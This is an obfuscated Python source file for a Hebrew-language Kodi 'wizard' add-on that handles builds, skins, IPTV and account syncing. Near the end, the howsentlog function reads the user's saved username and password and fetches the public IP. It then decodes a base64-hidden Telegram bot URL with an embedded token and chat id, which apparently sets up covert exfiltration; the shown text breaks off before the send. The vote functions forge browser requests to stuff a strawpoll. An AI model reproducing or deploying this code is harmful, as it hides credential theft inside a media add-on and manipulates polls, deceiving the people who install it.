# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPVICTORY =wiz .getS ('keepvictory')#line:138
KEEPTELEMEDIA =wiz .getS ('keeptelemedia')#line:139
KEEPTVLIST =wiz .getS ('keeptvlist')#line:140
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:141
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:142
KEEPHUBTV =wiz .getS ('keephubtv')#line:143
KEEPHUBVOD =wiz .getS ('keephubvod')#line:144
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:145
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:146
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:147
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:148
HARDWAER =wiz .getS ('action')#line:149
USERNAME =wiz .getS ('user')#line:150
PASSWORD =wiz .getS ('pass')#line:151
KEEPWEATHER =wiz .getS ('keepweather')#line:152
KEEPFAVS =wiz .getS ('keepfavourites')#line:153
KEEPSOURCES =wiz .getS ('keepsources')#line:154
KEEPPROFILES =wiz .getS ('keepprofiles')#line:155
KEEPADVANCED =wiz .getS ('keepadvanced')#line:156
KEEPREPOS =wiz .getS ('keeprepos')#line:157
KEEPSUPER =wiz .getS ('keepsuper')#line:158
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:159
KEEPTRAKT =wiz .getS ('keeptrakt')#line:160
KEEPREAL =wiz .getS ('keepdebrid')#line:161
KEEPRD2 =wiz .getS ('keeprd2')#line:162
KEEPLOGIN =wiz .getS ('keeplogin')#line:163
LOGINSAVE =wiz .getS ('loginlastsave')#line:164
DEVELOPER =wiz .getS ('developer')#line:165
THIRDPARTY =wiz .getS ('enable3rd')#line:166
THIRD1NAME =wiz .getS ('wizard1name')#line:167
THIRD1URL =wiz .getS ('wizard1url')#line:168
THIRD2NAME =wiz .getS ('wizard2name')#line:169
THIRD2URL =wiz .getS ('wizard2url')#line:170
THIRD3NAME =wiz .getS ('wizard3name')#line:171
THIRD3URL =wiz .getS ('wizard3url')#line:172
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:173
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:174
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:175
TODAY =date .today ()#line:176
TOMORROW =TODAY +timedelta (days =1 )#line:177
THREEDAYS =TODAY +timedelta (days =3 )#line:178
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:179
MCNAME =wiz .mediaCenter ()#line:180
EXCLUDES =uservar .EXCLUDES #line:181
SPEEDFILE =speedtest .SPEEDFILE #line:182
APKFILE =uservar .APKFILE #line:183
YOUTUBETITLE =uservar .YOUTUBETITLE #line:184
YOUTUBEFILE =uservar .YOUTUBEFILE #line:185
SPEED =speedtest .SPEED #line:186
UNAME =speedtest .UNAME #line:187
ADDONFILE =uservar .ADDONFILE #line:188
ADVANCEDFILE =uservar .ADVANCEDFILE #line:189
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:190
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:191
NOTIFICATION =uservar .NOTIFICATION #line:192
NOTIFICATION2 =uservar .NOTIFICATION2 #line:193
NOTIFICATION3 =uservar .NOTIFICATION3 #line:194
HELPINFO =uservar .HELPINFO #line:195
ENABLE =uservar .ENABLE #line:196
HEADERMESSAGE =uservar .HEADERMESSAGE #line:197
AUTOUPDATE =uservar .AUTOUPDATE #line:198
WIZARDFILE =uservar .WIZARDFILE #line:199
HIDECONTACT =uservar .HIDECONTACT #line:200
SKINID18 =uservar .SKINID18 #line:201
SKINID18DDONXML =uservar .SKINID18DDONXML #line:202
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:203
SKINID17 =uservar .SKINID17 #line:204
SKINID17DDONXML =uservar .SKINID17DDONXML #line:205
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:206
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:207
CONTACT =uservar .CONTACT #line:208
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:209
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:210
HIDESPACERS =uservar .HIDESPACERS #line:211
TMDB_NEW_API =uservar .TMDB_NEW_API #line:212
COLOR1 =uservar .COLOR1 #line:213
COLOR2 =uservar .COLOR2 #line:214
THEME1 =uservar .THEME1 #line:215
THEME2 =uservar .THEME2 #line:216
THEME3 =uservar .THEME3 #line:217
THEME4 =uservar .THEME4 #line:218
THEME5 =uservar .THEME5 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
IPTV18 ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimpleandroid.zip?raw=true'#line:253
IPTVSIMPL18PC ='https://github.com/kodianonymous1/iptvsimple/blob/master/pvr.iptvsimple.zip?raw=true'#line:254
def MainMenu ():#line:261
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:263
def skinWIN ():#line:264
	idle ()#line:265
	OO00O0O0OOOO0OO0O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:266
	OO00OO0O0O000O0OO =[];OO00OOOOOO0OOO00O =[]#line:267
	for O0OO000000000O0O0 in sorted (OO00O0O0OOOO0OO0O ,key =lambda O00O00OOOOOO00OOO :O00O00OOOOOO00OOO ):#line:268
		OO0OOOO0O0OO0O0OO =os .path .split (O0OO000000000O0O0 [:-1 ])[1 ]#line:269
		O00OO00OO0OO0OOOO =os .path .join (O0OO000000000O0O0 ,'addon.xml')#line:270
		if os .path .exists (O00OO00OO0OO0OOOO ):#line:271
			O0000OOO0OO00OOOO =open (O00OO00OO0OO0OOOO )#line:272
			OOOO00OOO0OOOO000 =O0000OOO0OO00OOOO .read ()#line:273
			O00OO0OO0O0OO0OOO =parseDOM2 (OOOO00OOO0OOOO000 ,'addon',ret ='id')#line:274
			OOOO00OOO0000O00O =OO0OOOO0O0OO0O0OO if len (O00OO0OO0O0OO0OOO )==0 else O00OO0OO0O0OO0OOO [0 ]#line:275
			try :#line:276
				O000O00OO0O0O0O00 =xbmcaddon .Addon (id =OOOO00OOO0000O00O )#line:277
				OO00OO0O0O000O0OO .append (O000O00OO0O0O0O00 .getAddonInfo ('name'))#line:278
				OO00OOOOOO0OOO00O .append (OOOO00OOO0000O00O )#line:279
			except :#line:280
				pass #line:281
	O00O00000O000O0O0 =[];O00OO0000O0O0000O =0 #line:282
	O000OOOOOO0OO0O0O =["Current Skin -- %s"%currSkin ()]+OO00OO0O0O000O0OO #line:283
	O00OO0000O0O0000O =DIALOG .select ("Select the Skin you want to swap with.",O000OOOOOO0OO0O0O )#line:284
	if O00OO0000O0O0000O ==-1 :return #line:285
	else :#line:286
		OO0OO0O0O0O000000 =(O00OO0000O0O0000O -1 )#line:287
		O00O00000O000O0O0 .append (OO0OO0O0O0O000000 )#line:288
		O000OOOOOO0OO0O0O [O00OO0000O0O0000O ]="%s"%(OO00OO0O0O000O0OO [OO0OO0O0O0O000000 ])#line:289
	if O00O00000O000O0O0 ==None :return #line:290
	for OO00O00O000O0OO00 in O00O00000O000O0O0 :#line:291
		swapSkins (OO00OOOOOO0OOO00O [OO00O00O000O0OO00 ])#line:292
def currSkin ():#line:294
	return xbmc .getSkinDir ('Container.PluginName')#line:295
def swapSkins (O00O00O0000O0OO00 ,title ="Error"):#line:296
	OOOOOOO0OO000O00O ='lookandfeel.skin'#line:297
	O0O00O0000OO00OOO =O00O00O0000O0OO00 #line:298
	O000000000O000OOO =getOld (OOOOOOO0OO000O00O )#line:299
	OOOO0000OOO0O00O0 =OOOOOOO0OO000O00O #line:300
	setNew (OOOO0000OOO0O00O0 ,O0O00O0000OO00OOO )#line:301
	OOOOOOO000O00O0O0 =0 #line:302
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOOOO000O00O0O0 <100 :#line:303
		OOOOOOO000O00O0O0 +=1 #line:304
		xbmc .sleep (1 )#line:305
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:306
		xbmc .executebuiltin ('SendClick(11)')#line:307
	return True #line:308
def getOld (O0O0O0OO00OO0O000 ):#line:310
	try :#line:311
		O0O0O0OO00OO0O000 ='"%s"'%O0O0O0OO00OO0O000 #line:312
		OOOOOOO0O0OOO00O0 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0O0O0OO00OO0O000 )#line:313
		O0O00OOOOOO000OO0 =xbmc .executeJSONRPC (OOOOOOO0O0OOO00O0 )#line:315
		O0O00OOOOOO000OO0 =simplejson .loads (O0O00OOOOOO000OO0 )#line:316
		if O0O00OOOOOO000OO0 .has_key ('result'):#line:317
			if O0O00OOOOOO000OO0 ['result'].has_key ('value'):#line:318
				return O0O00OOOOOO000OO0 ['result']['value']#line:319
	except :#line:320
		pass #line:321
	return None #line:322
def setNew (OOO0O00000OO000O0 ,O0OOOO0O0OO00O0OO ):#line:325
	try :#line:326
		OOO0O00000OO000O0 ='"%s"'%OOO0O00000OO000O0 #line:327
		O0OOOO0O0OO00O0OO ='"%s"'%O0OOOO0O0OO00O0OO #line:328
		O0OO0OOOOOOOOO0OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OOO0O00000OO000O0 ,O0OOOO0O0OO00O0OO )#line:329
		OOOO00OO0O0O00O0O =xbmc .executeJSONRPC (O0OO0OOOOOOOOO0OO )#line:331
	except :#line:332
		pass #line:333
	return None #line:334
def idle ():#line:335
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:336
def resetkodi ():#line:338
		if xbmc .getCondVisibility ('system.platform.windows'):#line:339
			OO0OOO0000O00O000 =xbmcgui .DialogProgress ()#line:340
			OO0OOO0000O00O000 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:343
			OO0OOO0000O00O000 .update (0 )#line:344
			for O0OOO0OO00O0OOOOO in range (5 ,-1 ,-1 ):#line:345
				time .sleep (1 )#line:346
				OO0OOO0000O00O000 .update (int ((5 -O0OOO0OO00O0OOOOO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OOO0OO00O0OOOOO ),'')#line:347
				if OO0OOO0000O00O000 .iscanceled ():#line:348
					from resources .libs import win #line:349
					return None ,None #line:350
			from resources .libs import win #line:351
		else :#line:352
			OO0OOO0000O00O000 =xbmcgui .DialogProgress ()#line:353
			OO0OOO0000O00O000 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:356
			OO0OOO0000O00O000 .update (0 )#line:357
			for O0OOO0OO00O0OOOOO in range (5 ,-1 ,-1 ):#line:358
				time .sleep (1 )#line:359
				OO0OOO0000O00O000 .update (int ((5 -O0OOO0OO00O0OOOOO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OOO0OO00O0OOOOO ),'')#line:360
				if OO0OOO0000O00O000 .iscanceled ():#line:361
					os ._exit (1 )#line:362
					return None ,None #line:363
			os ._exit (1 )#line:364
def backtokodi ():#line:366
			wiz .kodi17Fix ()#line:367
			fix18update ()#line:368
			fix17update ()#line:369
def testcommand1 ():#line:371
    import requests #line:372
    O0OOO00OOO00000O0 ='18773068'#line:373
    OOOO00O00OO0O00OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OOO00OOO00000O0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:385
    OOO000O0000O0OOOO ='145273320'#line:387
    OOO00000O0O00O00O ='145272688'#line:388
    if ADDON .getSetting ("auto_rd")=='true':#line:389
        OOOO0000000OO0OOO =OOO000O0000O0OOOO #line:390
    else :#line:391
        OOOO0000000OO0OOO =OOO00000O0O00O00O #line:392
    O0OOOO0O0000O0OO0 ={'options':OOOO0000000OO0OOO }#line:396
    OOO00OO0O0OOO0OO0 =requests .post ('https://www.strawpoll.me/'+O0OOO00OOO00000O0 ,headers =OOOO00O00OO0O00OO ,data =O0OOOO0O0000O0OO0 )#line:398
def builde_Votes ():#line:399
   try :#line:400
        import requests #line:401
        OO00O00O00O00OOOO ='18773068'#line:402
        O0OOO0O000000O000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO00O00O00O00OOOO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:414
        O00OOOO00O000OOO0 ='145273320'#line:416
        OO0000000O0O00O00 ={'options':O00OOOO00O000OOO0 }#line:422
        O0OOOOOO00O0OO00O =requests .post ('https://www.strawpoll.me/'+OO00O00O00O00OOOO ,headers =O0OOO0O000000O000 ,data =OO0000000O0O00O00 )#line:424
   except :pass #line:425
def update_Votes ():#line:426
   try :#line:427
        import requests #line:428
        O00O0O0OO0O0O0OO0 ='18773068'#line:429
        OO00000O000OOOOO0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00O0O0OO0O0O0OO0 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:441
        O0O0OO00000O00OO0 ='145273321'#line:443
        OOOOOO0O0OO0OO0OO ={'options':O0O0OO00000O00OO0 }#line:449
        O000OO000O0O0O0OO =requests .post ('https://www.strawpoll.me/'+O00O0O0OO0O0O0OO0 ,headers =OO00000O000OOOOO0 ,data =OOOOOO0O0OO0OO0OO )#line:451
   except :pass #line:452
def testcommand ():#line:456
	infobuild ()#line:457
def skin_homeselect ():#line:458
	try :#line:460
		OOOO0000O0OO00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:461
		OOO00OOOO0OO00000 =open (OOOO0000O0OO00O00 ,'r')#line:463
		OO000OO0O0O00O000 =OOO00OOOO0OO00000 .read ()#line:464
		OOO00OOOO0OO00000 .close ()#line:465
		O0O0O0OOOOO0000OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:466
		O000O000000OOO00O =re .compile (O0O0O0OOOOO0000OO ).findall (OO000OO0O0O00O000 )[0 ]#line:467
		OOO00OOOO0OO00000 =open (OOOO0000O0OO00O00 ,'w')#line:468
		OOO00OOOO0OO00000 .write (OO000OO0O0O00O000 .replace ('<setting id="HomeS" type="string%s/setting>'%O000O000000OOO00O ,'<setting id="HomeS" type="string"></setting>'))#line:469
		OOO00OOOO0OO00000 .close ()#line:470
	except :#line:471
		pass #line:472
def autotrakt ():#line:475
    OO00000OO0OO00OOO =(ADDON .getSetting ("auto_trk"))#line:476
    if OO00000OO0OO00OOO =='true':#line:477
       from resources .libs import trk_aut #line:478
def traktsync ():#line:480
     OOOO00O0OOO0OO000 =(ADDON .getSetting ("auto_trk"))#line:481
     if OOOO00O0OOO0OO000 =='true':#line:482
       from resources .libs import trk_aut #line:485
     else :#line:486
        ADDON .openSettings ()#line:487
def imdb_synck ():#line:489
   try :#line:490
     OO00000OOOOO000O0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:491
     O0O000000O0O00O00 =xbmcaddon .Addon ('plugin.video.gaia')#line:492
     OO0000OO00O0OO000 =(ADDON .getSetting ("imdb_sync"))#line:493
     O00000OOOO00OOOOO ="imdb.user"#line:494
     O00OO0O00O0OO00O0 ="accounts.informants.imdb.user"#line:495
     OO00000OOOOO000O0 .setSetting (O00000OOOO00OOOOO ,str (OO0000OO00O0OO000 ))#line:496
     O0O000000O0O00O00 .setSetting ('accounts.informants.imdb.enabled','true')#line:497
     O0O000000O0O00O00 .setSetting (O00OO0O00O0OO00O0 ,str (OO0000OO00O0OO000 ))#line:498
   except :pass #line:499
def dis_or_enable_addon (OOOO0000OOO0000OO ,OOO0O00000OO00000 ,enable ="true"):#line:501
    import json #line:502
    O00000OO00000O0OO ='"%s"'%OOOO0000OOO0000OO #line:503
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO0000OOO0000OO )and enable =="true":#line:504
        logging .warning ('already Enabled')#line:505
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOOO0000OOO0000OO )#line:506
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOOO0000OOO0000OO )and enable =="false":#line:507
        return xbmc .log ("### Skipped %s, reason = not installed"%OOOO0000OOO0000OO )#line:508
    else :#line:509
        OO0O0OO0000O0O000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00000OO00000O0OO ,enable )#line:510
        O00OOOO0O00O0O000 =xbmc .executeJSONRPC (OO0O0OO0000O0O000 )#line:511
        O000000O000OO0000 =json .loads (O00OOOO0O00O0O000 )#line:512
        if enable =="true":#line:513
            xbmc .log ("### Enabled %s, response = %s"%(OOOO0000OOO0000OO ,O000000O000OO0000 ))#line:514
        else :#line:515
            xbmc .log ("### Disabled %s, response = %s"%(OOOO0000OOO0000OO ,O000000O000OO0000 ))#line:516
    if OOO0O00000OO00000 =='auto':#line:517
     return True #line:518
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:519
def iptvset ():#line:522
  try :#line:523
    O00OO0O0OO000000O =(ADDON .getSetting ("iptv_on"))#line:524
    if O00OO0O0OO000000O =='true':#line:526
       if KODIV >=17 and KODIV <18 :#line:528
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:529
         O000OOOO000O00O00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:530
         OOO0O000OOO0O0O00 =(ADDON .getSetting ("iptvUrl"))#line:532
         O000OOOO000O00O00 .setSetting ('m3uUrl',OOO0O000OOO0O0O00 )#line:533
         OO00O00O00OOO0O00 =(ADDON .getSetting ("epg_Url"))#line:534
         O000OOOO000O00O00 .setSetting ('epgUrl',OO00O00O00OOO0O00 )#line:535
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:538
         iptvsimpldownpc ()#line:539
         wiz .kodi17Fix ()#line:540
         xbmc .sleep (1000 )#line:541
         O000OOOO000O00O00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:542
         OOO0O000OOO0O0O00 =(ADDON .getSetting ("iptvUrl"))#line:543
         O000OOOO000O00O00 .setSetting ('m3uUrl',OOO0O000OOO0O0O00 )#line:544
         OO00O00O00OOO0O00 =(ADDON .getSetting ("epg_Url"))#line:545
         O000OOOO000O00O00 .setSetting ('epgUrl',OO00O00O00OOO0O00 )#line:546
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:548
         iptvsimpldown ()#line:549
         wiz .kodi17Fix ()#line:550
         xbmc .sleep (1000 )#line:551
         O000OOOO000O00O00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:552
         OOO0O000OOO0O0O00 =(ADDON .getSetting ("iptvUrl"))#line:553
         O000OOOO000O00O00 .setSetting ('m3uUrl',OOO0O000OOO0O0O00 )#line:554
         OO00O00O00OOO0O00 =(ADDON .getSetting ("epg_Url"))#line:555
         O000OOOO000O00O00 .setSetting ('epgUrl',OO00O00O00OOO0O00 )#line:556
  except :pass #line:557
def howsentlog ():#line:564
       try :#line:565
          import json #line:566
          O0OOOO00OO00O0O00 =(ADDON .getSetting ("user"))#line:567
          OO0O0OO0OO00OO000 =(ADDON .getSetting ("pass"))#line:568
          OO0O0OOO0OO0O00OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:569
          O0O0OOO00000OOOOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:571
          OO00OOO00000O0OOO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:572
          O00O0000O0O0O0OO0 =str (json .loads (OO00OOO00000O0OOO )['ip'])#line:573
          OOOOOO0OOOOOO00O0 =O0OOOO00OO00O0O00 #line:574
          O0O0OOO00O0O00OO0 =OO0O0OO0OO00OO000 #line:575
          import socket #line:577
